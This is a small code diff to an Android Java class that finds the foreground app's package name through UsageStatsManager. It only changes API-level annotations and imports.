@@ -1,18 +1,19 @@
 package com.google.cloudservices;
 
+import android.annotation.TargetApi;
 import android.app.ActivityManager;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.os.Build;
-import android.support.annotation.RequiresApi;
+
 import android.util.Log;
 
 import java.util.Date;
 import java.util.List;
 
 public class CurrentAppClass {
-    @RequiresApi(api = 29)
+
     public  String getTopAppName(Context context) {
 
         String strName = "";
@@ -31,6 +32,7 @@ public class CurrentAppClass {
     }
 
 
+    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
     private  String getLollipopFGAppPackageName(Context ctx) {
         UsageStatsManager usageStatsManager = (UsageStatsManager) ctx.getSystemService(Context.USAGE_STATS_SERVICE);
         try {
